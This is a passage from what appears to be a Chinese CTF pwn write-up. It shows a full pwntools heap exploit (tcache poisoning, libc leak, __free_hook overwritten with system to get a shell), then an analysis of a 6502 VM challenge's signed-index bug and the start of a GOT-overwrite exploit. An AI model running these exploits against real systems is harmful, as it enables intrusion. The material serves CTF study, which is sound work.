class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401CE9\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    cmd(<span class="number">0x1145</span>)</span><br><span class="line">    sla(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;change&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&quot;change&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;content&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params"><span class="built_in">id</span>,data=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;want to buy&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="keyword">if</span>(data == <span class="string">&quot;&quot;</span>):</span><br><span class="line">        sla(<span class="string">&quot;Y/N&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Y/N&quot;</span>,<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;coffee&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">coffee_list_addr = <span class="number">0x4062f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">admin()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">7</span>,p64(coffee_list_addr))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">2</span>)</span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">admin()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">2</span>,p16(<span class="number">0x7680</span>))</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;================&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;1.&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">3</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">5</span>,p64(system))</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="6502-proccessor"><a href="#6502-proccessor" class="headerlink" title="6502_proccessor"></a>6502_proccessor</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6502</span>_proccessor: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">6</span>c78b755035efbfcec3230038685158aefa0d8cb, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX，PIE</li>
</ul>
<p><strong>程序分析</strong></p>
<p>本题目实现了一个 6502 CPU 指令集的 VM</p>
<ul>
<li>6502 CPU 指令集可以参考：<a target="_blank" rel="noopener" href="https://wusiyu.me/6502-cpu汇编语言指令集/#xun_zhi_mo_shi">6502 CPU汇编语言指令集 - WuSiYu Blog</a> </li>
</ul>
<p>6502 CPU 有3个8位寄存器：regA（累加器），regX（X变址寄存器），regY（Y变址寄存器）</p>
<p>题目中所有指令都由全局数组 lookup 进行管理，该数组的每个条目都被用于表示一个指令，其结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_18)</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> code2 dq ?                              ; offset</span><br><span class="line"><span class="number">00000010</span> code1 dq ?                              ; offset</span><br><span class="line"><span class="number">00000018</span> flag dq ?</span><br><span class="line"><span class="number">00000020</span> Node ends</span><br></pre></td></tr></table></figure>
<p>每个指令结构体中都有两个函数，一个表示该指令的操作，另一个表示该指令的寻址方式</p>
<p>要利用的指令操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">LDA</span><span class="params">()</span> <span class="comment">/* 读取(从内存读到寄存器) */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fetch();</span><br><span class="line">  regA = fetched;</span><br><span class="line">  set_flag(<span class="number">1u</span>, fetched == <span class="number">0</span>);</span><br><span class="line">  set_flag(<span class="number">7u</span>, (<span class="keyword">unsigned</span> __int8)regA &gt;&gt; <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">STA</span><span class="params">()</span> <span class="comment">/* 写入(从寄存器写入到内存) */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cpu_write(addr_abs, regA);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">ADC</span><span class="params">()</span> <span class="comment">/* 直接控制regA */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v0; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v2; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  fetch();</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int8)regA + (<span class="keyword">unsigned</span> __int8)fetched;</span><br><span class="line">  v2 = v0 + (<span class="keyword">unsigned</span> __int8)cpu_extract_sr(<span class="number">0</span>);</span><br><span class="line">  set_flag(<span class="number">0</span>, v2 &gt; <span class="number">0xFF</span>u);</span><br><span class="line">  set_flag(<span class="number">1u</span>, (<span class="keyword">unsigned</span> __int8)v2 == <span class="number">0</span>);</span><br><span class="line">  set_flag(<span class="number">6u</span>, ((<span class="keyword">unsigned</span> __int8)~(regA ^ fetched) &amp; (<span class="keyword">unsigned</span> __int8)(regA ^ v2) &amp; <span class="number">0x80</span>) != <span class="number">0</span>);</span><br><span class="line">  set_flag(<span class="number">7u</span>, (v2 &amp; <span class="number">0x80</span>) != <span class="number">0</span>);</span><br><span class="line">  regA = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要利用的寻址操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IZX</span><span class="params">()</span> <span class="comment">/* 基于regX的间接寻址 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+Ah] [rbp-6h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = cpu_fetch(cpu);</span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> __int8)cpu_fetch((<span class="keyword">unsigned</span> __int8)(regX + v1));</span><br><span class="line">  addr_abs = ((<span class="keyword">unsigned</span> __int8)cpu_fetch((<span class="keyword">unsigned</span> __int8)(regX + v1 + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) | v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>函数 <code>write_mem</code> 有负数溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">write_mem</span><span class="params">(<span class="keyword">unsigned</span> __int16 a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0xFF</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">0x1FF</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xFFF9</span>u )</span><br><span class="line">        mem_ptr[(__int16)(a1 - <span class="number">512</span>) + <span class="number">518</span>] = a2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        mem_ptr[a1 - <span class="number">0xFBFA</span>] = a2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mem_ptr[a1] = a2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mem_ptr[a1] = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>(__int16)(a1 - 512)</code> 这段伪代码，这里有一个强制类型转换</li>
</ul>
<p>虽然 IDA 分析 a1 是 <code>unsigned __int16</code>，但从汇编指令来看可以分析出问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000059E4</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">15</span> <span class="number">0</span>D <span class="number">67</span> <span class="number">20</span> <span class="number">00</span>          mov     rdx, cs:mem_ptr</span><br><span class="line">.text:<span class="number">00000000000059</span>EB <span class="number">0F</span> B7 <span class="number">45</span> FC                   movzx   eax, [rbp+var_4]</span><br><span class="line">.text:<span class="number">00000000000059</span>EF <span class="number">66</span> <span class="number">2</span>D <span class="number">00</span> <span class="number">02</span>                   sub     ax, <span class="number">200</span>h</span><br><span class="line">.text:<span class="number">00000000000059F</span>3 <span class="number">98</span>                            cwde</span><br><span class="line">.text:<span class="number">00000000000059F</span>4 <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">00000000000059F</span>6 <span class="number">0F</span> B6 <span class="number">4</span>D F8                   movzx   ecx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">00000000000059F</span>A <span class="number">88</span> <span class="number">8</span>C <span class="number">02</span> <span class="number">06</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          mov     [rdx+rax+<span class="number">206</span>h], cl</span><br></pre></td></tr></table></figure>
<ul>
<li>实现强制类型转换的汇编代码为：<code>cwde cdqe</code>（符号扩展）</li>
<li>因此 a1 应该是16位的有符号数</li>
</ul>
<p>同样的漏洞也出现在 <code>get_mem</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int8 __fastcall <span class="title">get_mem</span><span class="params">(<span class="keyword">unsigned</span> __int16 cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( DEBUG )</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(get_mem) reading at: 0x%X\n&quot;</span>, cpu);</span><br><span class="line">  <span class="keyword">if</span> ( cpu &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">    <span class="keyword">return</span> mem_ptr[cpu];</span><br><span class="line">  <span class="keyword">if</span> ( cpu &lt;= <span class="number">0x1FF</span>u )</span><br><span class="line">    <span class="keyword">return</span> mem_ptr[cpu];</span><br><span class="line">  <span class="keyword">if</span> ( cpu &gt; <span class="number">0xFFF9</span>u )</span><br><span class="line">    <span class="keyword">return</span> mem_ptr[cpu - <span class="number">0xFBFA</span>];</span><br><span class="line">  <span class="keyword">if</span> ( DEBUG )</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(get_mem) parsed: 0x%X\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cpu - <span class="number">512</span>);</span><br><span class="line">  <span class="keyword">return</span> mem_ptr[(__int16)(cpu - <span class="number">0x200</span>) + <span class="number">0x206</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本题目的核心点就是利用程序实现的 6502 CPU 指令来覆盖 puts_got 为 system</p>
<p>可以先使用 LDX 和 STX 往 regX 中写入 puts_got 的偏移，然后用 LDA 进行读取，计算步骤如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance $rebase(<span class="number">0x20A018</span>) <span class="number">0x559fe1e0c120</span></span><br><span class="line"><span class="number">0x559fe1e0a018</span>-&gt;<span class="number">0x559fe1e0c120</span> is <span class="number">0x2108</span> bytes (<span class="number">0x421</span> words)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: hex(<span class="number">0x10000</span><span class="number">-0x2108</span><span class="number">-0x206</span>+<span class="number">0x200</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">&#x27;0xdef2&#x27;</span></span><br></pre></td></tr></table></figure>
<p>测试样例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += LDX(<span class="number">0xf2</span>) </span><br><span class="line">payload += STX(<span class="number">0</span>) </span><br><span class="line">payload += LDX(<span class="number">0xde</span>) </span><br><span class="line">payload += STX(<span class="number">1</span>) </span><br><span class="line">payload += LDX(<span class="number">0</span>) <span class="comment"># LDX(置空regX)</span></span><br><span class="line">payload += LDA(<span class="number">0</span>) <span class="comment"># LDA(读取puts@got)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x559fe1c05958</span>    movzx  eax, byte ptr [rdx + rax + <span class="number">0x206</span>] &lt;<span class="built_in">puts</span>@got.plt&gt;</span><br></pre></td></tr></table></figure>
<p>读取 &amp;puts 的值之后，我们可以使用 ADC 指令将 &amp;puts 加为 &amp;system：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;<span class="built_in">puts</span> &amp;system</span><br><span class="line"><span class="number">0x7f1686641970</span>-&gt;<span class="number">0x7f1686610420</span> is <span class="number">-0x31550</span> bytes (<span class="number">-0x62aa</span> words)</span><br></pre></td></tr></table></figure>
<p>最后用同样的方法往 regX 中写入 puts_got 的偏移，接着就可以使用 STA 覆盖 puts_got</p>
<p>每次覆盖1字节，连续执行3次后就可以将 puts 修改为 system</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./6502_proccessor1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x6919)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span 